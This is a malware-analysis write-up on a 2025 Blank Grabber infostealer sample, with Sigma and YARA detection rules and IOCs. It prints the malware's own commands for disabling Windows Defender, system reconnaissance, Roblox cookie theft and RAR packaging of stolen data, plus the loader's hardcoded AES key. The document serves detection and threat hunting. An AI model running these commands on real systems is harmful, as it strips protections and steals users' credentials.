# Blank Grabber 2025: Anatomy of an Open-Source Stealer That Refuses to Die
### From Static Analysis to Threat Hunting

**Author:** DubzVX  
**Date:** 22 May 2025  
**Tags:** `malware-analysis` `infostealer` `threat-hunting` `python` `blue-team`  
**SHA1:** `b059e225abd3c19d337ed6ef5fb43d44d7748ee6`

---

## Table of Contents

1. [Context & Threat Intel](#1-context--threat-intel)
2. [Environment Setup](#2-environment-setup)
3. [Static Analysis](#3-static-analysis)
4. [Dynamic Analysis](#4-dynamic-analysis)
5. [Threat Hunting](#5-threat-hunting)
6. [IOCs & Detection Rules](#6-iocs--detection-rules)

---

## 1. Context & Threat Intel

### 1.1 What is Blank Grabber?

Blank Grabber is an open-source infostealer written in Python 3, designed to silently exfiltrate sensitive data from compromised Windows systems. Unlike commercial stealer families such as Lumma or RedLine, Blank Grabber stands out for being entirely public: its source code was hosted on GitHub, accessible to anyone wishing to use, modify, or redistribute it.

This accessibility is precisely what makes it a particularly interesting subject of study. Blank Grabber embodies a fundamental trend in the threat landscape: the democratization of offensive tools. No need to purchase access to a MaaS panel or negotiate on an underground forum — a simple repository clone is enough to obtain a functional, GUI-configurable stealer.

> **Analyst note:** The open-source nature of Blank Grabber cuts both ways for defenders. While known code facilitates static detection, the modular and freely modifiable nature of the project means that each sample observed in the wild can present significant variants. Hash-only signatures will quickly become obsolete.

### 1.2 Project Timeline

| Date | Event |
|------|-------|
| 2022 | Blank-c publishes the project on GitHub under an educational disclaimer. The stealer primarily targets Discord tokens, browser passwords, and Telegram sessions. |
| Mid-2023 | Blank-c archives the original repository and transfers the project to a new maintainer (noahmajors), who forks it under the account f4kedre4lity. The project receives over 300 commits within a few months. |
| 2024 | Malicious campaigns distribute Blank Grabber via typosquatted PyPI and npm packages, targeting developers and gamers (Roblox cookies, crypto wallets). Datadog, Socket, and Imperva publish partial analyses. |
| 2025 | Splunk documents a loader concealment technique abusing digital certificates. The active fork continues to receive updates. No complete analysis covering the current version is publicly available. |

### 1.3 Victim Profile & Distribution Vectors

Blank Grabber does not target a specific industry: its opportunistic nature makes it a cross-cutting threat. Nevertheless, observed campaigns paint a recurring victim profile: gamers (Roblox cookies, Steam accounts), cryptocurrency holders, developers (GitHub sessions, API tokens), and Discord and Telegram users.

Documented distribution vectors include fake cracked software distributed on piracy forums, malicious archives shared via Discord, GitHub repositories masquerading as legitimate tools, and malicious packages published on PyPI and npm via typosquatting.

### 1.4 Why Blank Grabber in 2025?

Although the original repository has been archived since August 2023, Blank Grabber is far from dead. The active fork is regularly updated, and samples continue to appear in security solution telemetry. Its popularity rests on several factors: full source code accessibility, a GUI build interface, modular architecture allowing each feature to be toggled on or off, and exfiltration via legitimate services (Discord webhooks, Telegram bots) that complicate network filtering.

For analysts, it is an ideal case study: the availability of the source code allows direct correlation between dynamically observed artifacts and statically identified Python functions.

---

## 2. Environment Setup

### 2.1 Analysis VM

- Windows 10/11 VM (VMware or VirtualBox) — clean snapshot taken **before** any execution
- Network in **Host-Only** or **Internal Network** mode — no direct NAT
- FakeNet-NG configured to simulate DNS/HTTP/HTTPS
- Windows Defender disabled via folder exclusion:

```powershell
Add-MpPreference -ExclusionPath "C:\Samples"
```

### 2.2 Tools Used

| Phase | Tool | Purpose |
|-------|------|---------|
| Unpacking | pyinstxtractor | Extract .pyc from PyInstaller binary |
| Decompilation | PyLingual | Decompile .pyc → readable Python source |
| Static PE | Detect-It-Easy (DIE) | Packer/compiler detection |
| Dynamic | Procmon + Process Hacker | File, registry, process activity |
| Network | Wireshark + FakeNet-NG | Traffic capture and simulation |
| Sandbox | Triage / Hybrid Analysis | Controlled dynamic execution |
| Hunting | Sigma CLI + YARA | Detection rule writing |

---

## 3. Static Analysis

### 3.1 PE Analysis — DIE Output

```
Packer: PyInstaller[overlay; modified]
Python: 3.13
```

**Finding #1 — Modified PyInstaller stub**

DIE identifies the binary as `PyInstaller [overlay; modified]`. The `modified` tag indicates the PyInstaller bootloader has been patched — its signature has been altered to evade detections based on the standard bootloader. The `overlay` tag confirms that data is appended after the end of the standard PE, which is where PyInstaller stores the Python file archive.

This is an original finding: the majority of existing Blank Grabber analyses document vanilla PyInstaller builds. This sample uses a deliberately modified stub, suggesting an operator with more than script-kiddie level knowledge.

### 3.2 PyInstaller Extraction

```powershell
python pyinstxtractor.py sample.exe
```

```
[+] Pyinstaller version: 2.1+
[+] Python version: 3.13
[+] Length of package: 10356154 bytes
[!] Warning: File name b'\x00\xf7\x9f\x1dE\xb3[X\x00\x00\x00\x00\x00\x00' contains invalid bytes.
    Using random name: c8b9112c-3001-40b2-8911-fe971f0b09f3
[+] Found 48 files in CArchive
[+] Possible entry point: c8b9112c-3001-40b2-8911-fe971f0b09f3.pyc
```

**Finding #2 — Null bytes in filename (anti-analysis)**

The main entry point file contains deliberate null bytes (`\x00`) in its filename — an intentional anti-analysis technique designed to crash automated tools that attempt to process the filename as a standard string. pyinstxtractor handles this gracefully by substituting a random UUID, but less robust tools would fail silently here.

**Finding #3 — Python 3.13**

The use of Python 3.13 is consistent with an actively maintained fork updated in 2024/2025. Older analyses of Blank Grabber document Python 3.8–3.10 builds.

### 3.3 Loader Analysis — AES Decryption Layer

Decompilation of the main `.pyc` entry point reveals a decryption loader:

```python
from pyaes import AESModeOfOperationGCM
from zipimporter import zipimporter

zipfile = os.path.join(sys._MEIPASS, "blank.aes")
module  = "stub-o"

key = base64.b64decode("63jV+oCJec7LjFcSdyObCypOQS/2MT8q6blr9Sz/0XA=")
iv  = b"lspmDW0APce1V1zOc"

def decrypt(key, iv, ciphertext):
    return AESModeOfOperationGCM(key).decrypt(ciphertext)
```

**Finding #4 — Custom AES implementation with hardcoded key/IV**

The real stealer payload is stored in `blank.aes`, encrypted with a custom AES implementation using a hardcoded key and IV. Analysis confirms the implementation is non-standard — it deviates from both standard AES-GCM and AES-CTR behavior, consistent with findings from Splunk's STRT team on similar samples.

> **Confidentiality note:** The full decryption script and decrypted payload are not shared in this article to prevent malicious reuse and potential data leakage. The key, IV, and encrypted file are documented as IOCs for detection purposes only.

**Finding #5 — Encrypted payload confirmed**

The file `blank.aes` (89,678 bytes) is present in the extracted PyInstaller bundle and confirmed as a high-entropy encrypted container for the stealer's core logic.

---

## 4. Dynamic Analysis

Dynamic analysis was performed using Triage sandbox. The following sections document observed behavior.

### 4.1 Execution & Persistence

The binary executes from `%TEMP%\blankgrabber.exe` and immediately begins a defense evasion routine before any data collection.

**Execution path:**
```
C:\Users\Admin\AppData\Local\Temp\blankgrabber.exe (PID: 2640)
```

### 4.2 Defense Evasion — Defender Bypass

**Finding #6 — Aggressive Defender disabling**

One of the first actions performed is a full Windows Defender takedown via a two-stage PowerShell command:

```powershell
# Stage 1 — Self-exclusion
powershell -Command Add-MpPreference -ExclusionPath 
  'C:\Users\Admin\AppData\Local\Temp\blankgrabber.exe'

# Stage 2 — Full disable + definition removal
powershell Set-MpPreference 
  -DisableIntrusionPreventionSystem $true
  -DisableIOAVProtection $true
  -DisableRealtimeMonitoring $true
  -DisableScriptScanning $true
  -EnableControlledFolderAccess Disabled
  -EnableNetworkProtection AuditMode
  -Force
  -MAPSReporting Disabled
  -SubmitSamplesConsent NeverSend

"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

This is notably more aggressive than a simple real-time monitoring toggle — it disables script scanning, IPS, cloud reporting, sample submission, and removes all virus definitions.

### 4.3 System Reconnaissance

**Finding #7 — Comprehensive fingerprinting**

The stealer performs extensive system reconnaissance before data collection, using native Windows tools to avoid introducing suspicious binaries:

```
systeminfo                          → Full OS info, RAM, architecture
wmic os get Caption                 → OS version
wmic computersystem get totalphysicalmemory → RAM
wmic csproduct get uuid             → Machine UUID (unique victim ID)
wmic path win32_VideoController get name → GPU name (anti-VM check)
getmac                              → MAC address
netsh wlan show profile             → Saved WiFi profiles
tasklist /FO LIST                   → Running processes (x3 calls)
tree /A /F                          → Full filesystem tree (x6 calls)
powershell Get-Clipboard            → Clipboard contents
```

Registry reads for additional fingerprinting:
```
HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform\BackupProductKeyDefault
→ Windows product key

HKLM:System\CurrentControlSet\Control\Session Manager\Environment\PROCESSOR_IDENTIFIER
→ CPU identifier
```

> **Analyst note:** The `tree /A /F` command is called 6 times — this may indicate multiple modules running concurrently, each performing their own filesystem enumeration. It is a strong behavioral indicator for detection.

### 4.4 Credential & Data Theft

**Finding #8 — Roblox cookie theft**

```powershell
# HKCU check
powershell Get-ItemPropertyValue 
  -Path HKCU:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com 
  -Name .ROBLOSECURITY

# HKLM check
powershell Get-ItemPropertyValue 
  -Path HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com 
  -Name .ROBLOSECURITY
```

The stealer checks both HKCU and HKLM hives — a thoroughness not documented in older analyses.

**Finding #9 — Screenshot capture via encoded PowerShell**

A Base64-encoded PowerShell command compiles a .NET class on the fly using `csc.exe` to capture screenshots of all monitors and save them as PNG files:

```
csc.exe /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\jelnqpj0\jelnqpj0.cmdline"
cvtres.exe → CSCA7B21088A3E34903A46850B946761A52.TMP
```

The in-memory compilation via `csc.exe` avoids dropping a pre-compiled binary on disk.

**Finding #10 — Antivirus enumeration**

```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

Enumerates installed security products — likely used to enrich the victim report sent to the operator.

### 4.5 Data Packaging & Exfiltration

**Finding #11 — RAR archive with hardcoded password**

```
rar.exe a -r -hp"6969" "C:\Users\Admin\AppData\Local\Temp\pnfrL.zip" *
```

All collected data is compressed into a password-protected RAR archive using the hardcoded password `6969`. The archive is dropped in `%TEMP%` before exfiltration. This is a very specific IOC.

**Finding #12 — Telegram C2 exfiltration**

```
DNS: api.telegram.org → 149.154.166.110
```

This sample uses Telegram as its C2 channel, deviating from the Discord webhook approach documented in older Blank Grabber analyses. Telegram bots are increasingly preferred by operators due to the difficulty of takedowns compared to Discord webhooks.

**Finding #13 — Victim geolocation**

```
GET http://ip-api.com/json/?fields=225545
```

The bitmask `225545` requests: country, region, city, ISP, organization, AS number, and public IP. This enriches the stolen data sent to the operator with victim geolocation.

**Finding #14 — Connectivity check (anti-sandbox)**

```
DNS: gstatic.com
DNS: c.pki.goog
```

Classic internet connectivity check before acting — a common anti-sandbox technique to avoid executing in isolated environments.

---

## 5. Threat Hunting

### 5.1 Behavioral Indicators Summary

Based on this analysis, the following behavioral patterns are reliable indicators of Blank Grabber activity:

| Indicator | Type | Confidence |
|-----------|------|-----------|
| PyInstaller binary with null bytes in embedded filename | Static | High |
| `cmd.exe` spawning PowerShell `Add-MpPreference -ExclusionPath` | Process | High |
| `MpCmdRun.exe -RemoveDefinitions -All` | Process | High |
| `rar.exe` with `-hp"6969"` argument | Process | High |
| `tree /A /F` called 3+ times in short succession | Process | Medium |
| `wmic csproduct get uuid` from non-admin context | Process | Medium |
| `GET ip-api.com/json/?fields=225545` from non-browser process | Network | High |
| `api.telegram.org` DNS from non-Telegram process | Network | High |
| `csc.exe` spawned from `%TEMP%` path | Process | Medium |
| `Get-ItemPropertyValue` reading `.ROBLOSECURITY` | Registry | High |

### 5.2 Sigma Rules

#### Rule 1 — Defender Aggressive Disable

```yaml
title: Blank Grabber - Aggressive Windows Defender Disable
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects Blank Grabber's aggressive Defender disabling routine
author: DubzMalwareLab
date: 2025-05-22
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  category: process_creation
  product: windows
detection:
  selection_mpcmdrun:
    Image|endswith: '\MpCmdRun.exe'
    CommandLine|contains: '-RemoveDefinitions -All'
  selection_powershell:
    Image|endswith: '\powershell.exe'
    CommandLine|contains|all:
      - 'DisableRealtimeMonitoring'
      - 'DisableIOAVProtection'
      - 'SubmitSamplesConsent'
  condition: selection_mpcmdrun or selection_powershell
falsepositives:
  - Legitimate administrator actions (very unlikely with this combination)
level: high
```

#### Rule 2 — RAR Archive with Hardcoded Password

```yaml
title: Blank Grabber - Data Exfiltration via Password-Protected RAR
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects Blank Grabber's data packaging with hardcoded RAR password
author: DubzMalwareLab
date: 2025-05-22
tags:
  - attack.exfiltration
  - attack.t1560.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\rar.exe'
    CommandLine|contains|all:
      - ' a '
      - '-hp"6969"'
      - '%TEMP%'
  condition: selection
falsepositives:
  - None expected
level: critical
```

#### Rule 3 — Roblox Cookie Theft

```yaml
title: Blank Grabber - Roblox Session Cookie Theft
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: Detects registry access to Roblox session cookies
author: DubzMalwareLab
date: 2025-05-22
tags:
  - attack.credential_access
  - attack.t1552.002
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains|all:
      - 'RobloxStudioBrowser'
      - '.ROBLOSECURITY'
  condition: selection
falsepositives:
  - Roblox Studio legitimate usage (rare)
level: high
```

#### Rule 4 — ip-api.com Geolocation Beacon

```yaml
title: Blank Grabber - Victim Geolocation via ip-api.com
id: d4e5f6a7-b8c9-0123-defa-234567890123
status: experimental
description: Detects network request to ip-api.com with specific field bitmask used by Blank Grabber
author: DubzMalwareLab
date: 2025-05-22
tags:
  - attack.discovery
  - attack.t1590
logsource:
  category: proxy
detection:
  selection:
    cs-uri-query|contains: 'fields=225545'
    cs-host: 'ip-api.com'
  filter_browsers:
    cs-username|contains:
      - 'chrome'
      - 'firefox'
      - 'msedge'
  condition: selection and not filter_browsers
falsepositives:
  - Other malware families using same geolocation API
level: medium
```

#### Rule 5 — Filesystem Enumeration Pattern

```yaml
title: Blank Grabber - Repeated Filesystem Tree Enumeration
id: e5f6a7b8-c9d0-1234-efab-345678901234
status: experimental
description: Detects repeated tree /A /F calls characteristic of Blank Grabber's modular enumeration
author: DubzMalwareLab
date: 2025-05-22
tags:
  - attack.discovery
  - attack.t1083
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\tree.com'
    CommandLine|contains: '/A /F'
  timeframe: 60s
  condition: selection | count() > 3
falsepositives:
  - Legitimate admin scripts (unlikely at this frequency)
level: medium
```

### 5.3 YARA Rule

```yara
rule BlankGrabber_2025_PyInstaller_Modified
{
    meta:
        description = "Detects Blank Grabber 2025 variant with modified PyInstaller stub"
        author      = "DubzMalwareLab"
        date        = "2025-05-22"
        hash        = "b059e225abd3c19d337ed6ef5fb43d44d7748ee6"
        reference   = "Original analysis"

    strings:
        // AES key hardcoded in loader
        $aes_key = "63jV+oCJec7LjFcSdyObCypOQS/2MT8q6blr9Sz/0XA=" ascii

        // Encrypted payload filename
        $payload  = "blank.aes" ascii

        // Target module name
        $module   = "stub-o" ascii

        // RAR password
        $rar_pwd  = "-hp\"6969\"" ascii wide

        // ip-api bitmask
        $geoip    = "fields=225545" ascii

        // Roblox theft
        $roblox   = ".ROBLOSECURITY" ascii wide

        // PyInstaller overlay magic
        $pyinst   = { 4D 45 49 } // MEI prefix

    condition:
        uint16(0) == 0x5A4D and
        (
            ($aes_key and $payload and $module) or
            ($rar_pwd and $roblox) or
            ($geoip and $roblox and $pyinst)
        )
}
```

---

## 6. IOCs & Detection Rules

### 6.1 File IOCs

| Type | Value | Description |
|------|-------|-------------|
| SHA1 | `b059e225abd3c19d337ed6ef5fb43d44d7748ee6` | Sample hash |
| Filename | `blankgrabber.exe` | Common dropper name |
| Filename | `blank.aes` | Encrypted payload container |
| Filename | `stub-o` | Decrypted module name |
| Path | `%TEMP%\blankgrabber.exe` | Execution path |
| Path | `%TEMP%\_MEI*\rar.exe` | Embedded RAR binary |

### 6.2 Network IOCs

| Type | Value | Description |
|------|-------|-------------|
| Domain | `api.telegram.org` | C2 exfiltration channel |
| Domain | `ip-api.com` | Victim geolocation |
| IP | `149.154.166.110` | Telegram API server |
| URI | `/json/?fields=225545` | Specific ip-api query |

### 6.3 Behavioral IOCs

| Type | Value | Description |
|------|-------|-------------|
| Process arg | `-hp"6969"` | RAR hardcoded password |
| Registry | `HKCU\SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com\.ROBLOSECURITY` | Roblox cookie theft |
| Registry | `HKLM\SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com\.ROBLOSECURITY` | Roblox cookie theft |
| CommandLine | `MpCmdRun.exe -RemoveDefinitions -All` | Defender definition removal |
| CommandLine | `fields=225545` | Geolocation bitmask |

### 6.4 AES Encryption Parameters (Static IOCs)

| Parameter | Value |
|-----------|-------|
| Key (Base64) | `63jV+oCJec7LjFcSdyObCypOQS/2MT8q6blr9Sz/0XA=` |
| IV | `lspmDW0APce1V1zOc` |
| Payload file | `blank.aes` |
| Implementation | Custom pyaes (non-standard) |

> **Note:** These values are shared as static detection IOCs only. The decryption tooling is not published in this article for confidentiality reasons and to prevent potential malicious reuse.

---

## Conclusion

This analysis of Blank Grabber reveals a stealer that has meaningfully evolved from its original 2022 codebase. Key takeaways:

- The modified PyInstaller stub and null-byte filename anti-analysis technique suggest an operator with above-average technical capability
- The shift from Discord webhooks to Telegram C2 reflects broader ecosystem changes following Discord's increased enforcement
- The non-standard AES implementation adds a meaningful layer of complexity against automated sandbox decryption
- The combination of Roblox targeting, crypto wallet theft, and full system fingerprinting confirms a young/gamer demographic as primary victim profile
- Despite the original repository being archived since 2023, active development and in-the-wild samples confirm Blank Grabber remains a relevant threat in 2025

The Sigma and YARA rules provided in this article offer actionable detection coverage across the kill chain — from initial execution through to C2 exfiltration.

---

*This article was written for educational and defensive security purposes. All analysis was performed in an isolated lab environment.*
